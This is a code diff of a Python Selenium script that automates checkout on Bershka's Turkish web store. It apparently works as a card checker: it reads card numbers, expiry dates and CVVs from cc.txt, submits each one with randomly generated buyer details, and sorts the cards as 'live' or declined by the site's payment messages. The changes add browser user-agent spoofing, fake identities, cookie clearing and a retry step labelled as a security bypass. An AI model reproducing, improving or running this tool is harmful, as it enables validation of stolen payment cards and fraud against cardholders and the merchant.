@@ -1,33 +1,27 @@
-#writing by aligollez for tests and education , The person who uses it is responsible for everything originating from the program.
-#
-
-import os
+from http import client
+from typing import Text
+from selenium import webdriver
+from colorama import Fore, Back, Style, init
+from selenium.webdriver.firefox.options import Options
+from selenium.webdriver.support import expected_conditions
+from selenium.webdriver.support import select
+from selenium.webdriver.support.wait import WebDriverWait
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.select import Select
+from selenium.webdriver.support.ui import Select
+import random
+import string
 import random
 import re
 import string
-import sys
-from http import client
-from time import sleep
-from typing import BinaryIO, Text
-from colorama import Fore, Back, Style, init
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.by import By
-from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.firefox.options import Options
-from selenium.webdriver.support import expected_conditions
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.support import select
-from selenium.webdriver.support.select import Select
-from selenium.webdriver.support.ui import Select
-from selenium.webdriver.support.wait import WebDriverWait
 
+
+from time import sleep
 
 def funct():
-    #Open cc.txt in the folder where bershka.py is located and add to it 
-    # ☑ 54066xxxxxxxx|07|2024|025 <== (The year should be 4 numbers, not 2 numbers. otherwise it will not work correctly )
-    # ✖ 54066xxxxxxxx|07|24|025  <== (if you do as in this example you will get wrong result)
     CCList = open(r'/home/kali/Masaüstü/Register User/cc.txt', "r", encoding="utf8").read().splitlines()
     kartlar = []
 
@@ -43,28 +37,23 @@ letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
 def random_char(char_num):
        return ''.join(random.choice(string.ascii_letters) for _ in range(char_num))
 
-caps = webdriver.DesiredCapabilities.CHROME.copy() 
-caps['acceptInsecureCerts'] = True
-options = webdriver.ChromeOptions()
-options.add_experimental_option("excludeSwitches", ["enable-logging"])
-options.add_argument('--silent')
-options.add_argument('--lang=tr')
-options.add_argument('--disable-gpu')
-options.add_argument('--ignore-certificate-errors')
-options.add_argument('--no-sandbox')
-#options.add_argument('--headless')
-#options.add_argument("headless")
-driver = webdriver.Chrome(executable_path=r'/home/kali/Masaüstü/Register User/chromedriver', options=options)
-driver.set_window_size(360,640)
-
+user_agent =" Mozilla/5.1 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1"
+profile = webdriver.FirefoxProfile() 
+profile.set_preference("general.useragent.override", user_agent)
+options = webdriver.FirefoxOptions()
+options.headless = False
+driver = webdriver.Firefox(profile, options=options)
+wait = WebDriverWait(driver, 26, poll_frequency=1)
+print('Starting ..')
+driver.delete_all_cookies()
+buy = ("https://www.bershka.com/tr/aslan-burcu-u%C3%A7lu-kolye-c0p103013723.html?colorId=302")
 wait = WebDriverWait(driver, 25, poll_frequency=1)
 init(autoreset=True)
 while True:
 
         print('Starting ..')
-        driver.delete_all_cookies()
         #Purchased product link here  , change it if the product is out of stock
-        driver.get("https://www.bershka.com/tr/8-k%C4%B1l%C4%B1f%C4%B1-c0p103091543.html?colorId=512")
+        driver.get(buy)
         sleep(2)
         wait.until(EC.presence_of_element_located((By.ID, 'onetrust-close-btn-container'))).click()
         wait.until(
@@ -81,16 +70,17 @@ while True:
         wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'button.inverse:nth-child(2)'))).click()
         wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'bsk-store-address.stores-address-container:nth-child(1) > div:nth-child(1)'))).click()
         wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div"))).click()
-        wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div/input"))).send_keys("ahe3eds")
+        wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[1]/div/input"))).send_keys(random_char(5))
         driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").click()
-        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").send_keys("limkd3ert")
+        driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[2]/div/input").send_keys(random_char(5))
         driver.find_element_by_name("email").click()
-        driver.find_element_by_name("email").send_keys("ka35d32s39et@mail.com")
+        driver.find_element_by_name("email").send_keys(random_char(5)+"@mail.com")
         driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").click()
         driver.find_element_by_xpath("/html/body/div[20]/div[1]/div[2]/div[1]/checkout-shipping/div/div[1]/shipping-pickup/div/address-form/form/ng-form/ul/li[4]/phone-field/ng-form/ul/li[2]/div/input").send_keys("5344443565")
         driver.find_element_by_xpath("//*[@id='summary-wrapper']/div/div[2]/div/div/cta-checkout/div/div/div[2]/div").click()
+        print( Fore.GREEN +"kayıt tamamlandı.")
         sleep(1)
-        driver.find_element_by_css_selector("#summary-wrapper > div > div.summary-cta > div > div > cta-checkout > div > div > div.cta-checkout-post > div > button").click()
+        #driver.find_element_by_css_selector("#summary-wrapper > div > div.summary-cta > div > div > cta-checkout > div > div > div.cta-checkout-post > div > button").click()
          
         tikli = False
         kartlar = funct()
@@ -110,18 +100,21 @@ while True:
             wait.until(
              EC.presence_of_element_located((By.XPATH, '/html/body/div[20]/div[1]/div[2]/div/checkout-payment/div/div/div[1]/form/div[1]/payment-credit-card/ng-form/ul/li[1]/div/input'))
             ).send_keys(cc)
+            sleep(0.4)
             wait.until(
              EC.presence_of_element_located((By.NAME, "month"))
             ).click()
             wait.until(
              EC.presence_of_element_located((By.NAME, "month"))
-            ).send_keys(mm)          
+            ).send_keys(mm) 
+            sleep(0.3)         
             wait.until(
             EC.presence_of_element_located((By.NAME, "year"))
             ).click  
             wait.until(
             EC.presence_of_element_located((By.NAME, "year"))
-            ).send_keys(yy)  
+            ).send_keys(yy) 
+            sleep(0.5) 
             wait.until(
             EC.presence_of_element_located((By.NAME, "cvv2"))
             ).clear()
@@ -131,7 +124,7 @@ while True:
             wait.until(
             EC.presence_of_element_located((By.NAME, "holder"))
             ).clear()
-            driver.find_element_by_name("holder").send_keys("alicae ase") 
+            driver.find_element_by_name("holder").send_keys("ali"+random_char(5)) 
             try:
                 sleep(1)
                 dropdown = driver.find_element(By.NAME, "paymentModeId")
@@ -155,14 +148,25 @@ while True:
                 print(Fore.GREEN +"LİVE KART NO"," :", cc,"|",mm,"|",yy,"|",cvv,)
                 #print(cikti.text) 
             elif 'Sipariş tamamlanamadı. İşlem reddedildi. Girdiğiniz bilgileri kontrol edin veya farklı bir ödeme yöntemi deneyin.' in driver.page_source: 
-                print(Fore.RED +"DEC KART"," :", cc,"|",mm,"|",yy,"|",cvv,)
+                print(Fore.RED +"DEC KART"," :", cc,"|",mm,"|",yy,"|",cvv,
+                open('live.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'\n'))
+
             elif 'Hata oldu. Lütfen daha sonra tekrar deneyiniz. Problemin devam etmesi durumunda bizimle iletişime geçiniz.' in driver.page_source: 
-                print(Fore.RED +"PROGRAMI RESTART ET !"," :", cc,"|",mm,"|",yy,"|",cvv,)
+                print(Fore.RED +"Güvenlik Bypass Yapılıyor. !"," :", cc,"|",mm,"|",yy,"|",cvv,)
+                driver.delete_all_cookies
+                driver.get(buy)
+
             elif 'Transaction not completed. Enter the expiry date on your card' in driver.page_source:
                 print(Fore.RED +"DEC KART"," :", cc,"|",mm,"|",yy,"|",cvv,)
             
             sleep(1)
+            driver.delete_all_cookies
+            driver.get("https://www.bershka.com/tr/")
+            sleep(3)
             driver.get("https://www.bershka.com/tr/checkout.html")
+            sleep(2)
+            driver.refresh()
+            sleep(2)
             tikli = False
             sleep(1)
 
